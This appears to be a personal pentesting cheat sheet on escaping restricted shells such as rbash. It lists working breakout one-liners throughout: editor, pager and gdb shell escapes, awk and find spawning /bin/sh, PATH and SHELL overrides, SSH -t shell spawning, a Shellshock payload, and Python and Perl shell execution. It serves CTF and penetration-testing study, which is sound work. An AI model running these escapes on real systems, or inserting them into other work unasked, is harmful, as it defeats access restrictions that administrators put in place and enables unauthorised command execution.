# Reconnaissance
Find out as much as you can about the environment

`env` to see the exported variuables
` echo $PATH` to find out thwht the path is set to
` echo $SHELL` to find out what SHELL we are in usually rbash or rksh
Try basic commands to see whats allowed. Some commands let you execture other systtem commands often bypassing shell restricitons
- ls
- pwd
- cd
- ..
- env
- set
- export
- vi/vim -> `:!/bin/sh`
- cp
- mv
- ftp -> `!/bin/sh`
- gdb -> `!/bin/sh`
- more -> `!/bin/sh`
- less -> `!/bin/sh`
- man -> `!/bin/sh`
- `scp -S /tmp/getMeOut.sh x y:`
- `awk 'BEGIN {system("/bin/sh")}'`
- `find / -name someName -exec /bin/sh \;`

https://gtfobins.github.io/ is a great doc for all the binaries

# Quick wins
if `/` are allowed in commands try:
`/bin/sh`

If you can set the PATH or SHELL variables try:
`export PATH=/bin:/usr/bin:$PATH`

`export SHELL=/bin/sh `

If you can copy files into existing PATH try
`cp /bin/sh /some/dir/from/PATH; sh `

# Other stuff to try
Some commands let you execture other systtem commands often bypassing shell restricitons

## Comming in from the outside

Use SSH on your machine to execute commands before the remote shell is leaded
```
ssh restriced@10.20.30.40 -t "/bin/sh"
```

start remote sehll without loading `rc`
```
ssh restriced@10.20.30.40 -t "bash --noprofile"
```

try shelshock if vulnerable
```
ssh restriced@10.20.30.40 -t "() { :; }; /bin/bash"
```

## Try it

write files using `tee`
```
echo "some bad code" | tee script.sh
```
invoke the shell through a sciropitn language
```
python -c 'import os; os.system("/bin/bash")'
```
```
perl -e 'exec "/bin/sh"'
```
